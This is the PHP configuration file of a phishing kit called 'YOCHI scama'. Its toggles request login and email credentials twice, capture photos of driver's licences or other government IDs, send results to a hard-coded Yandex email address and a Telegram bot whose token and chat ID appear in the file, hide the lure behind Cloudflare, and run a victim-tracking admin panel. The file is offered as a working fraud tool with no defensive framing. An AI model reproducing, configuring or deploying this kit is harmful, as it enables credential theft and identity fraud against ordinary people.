<?php
###########################################################################################################
# <------- YOCHI SCAMA CONFIGURATION FILE <></>
/*
TOGGLE ON / OFF:
1 : ENABLE.
0 : DISABLE.
USE 1 OR 0 to SET FEATURES ON OR OFF*/

$mobileonly=0;                     # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
$usecaution=1;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
$cautioncontent='info';            # <--- card / deposit / update /info ..... content for caution page. 
$createfolderpersession=1;         # <--- CREATE A NEW FOLDER FOR EACH SESSION
$ftpsave=0;                        # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
$sendtoemail=1;                    # <--- SEND RESULTS TO EMAIL
$sendtotg=1;                       # <--- SEND RESULTS TO TELEGRAM
$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
$cloudflarelanding=1;              # <--- USE CLOUDFLARE FOR LANDING PAGE
$grabemail=1;                      # <--- GRAB EMAIL ACCESS
$grabidphoto=1;                    # <--- GRAB PHOTO OF DL OR ANY OTHER GOV. ID
$send = "briangateway@yandex.com";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
$tgbot = "5583917465:AAGSpIWSC3jgoYICoUpfyV8bcjx_X1MkLTc";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid = "803318592";               # <--- YOUR TELEGRAM CHAT ID
$resultheading = "🎌 YOCHI 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
$adminpass = "";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
// goto yourdomain.com/admin/index.php to track visiting activity
/*  ___      ___      _______  __
    \  \    /  /     /  _____||  |
     \  \  /  /	    /  /      |  |
      \  \/  /	   |  |	      |  |___    O
       \    /____  |  |       |   ___ \	 _
        |  |/_ _ \ |  |       |  |   \ || |
        |  | o_o  | \  \____  |  |   | || |
        |__|\____/   \______| |__|   | ||_|      grrrr
	Telegram : @yo_chi
	If you experience any issues or for upgrade
									   */
?>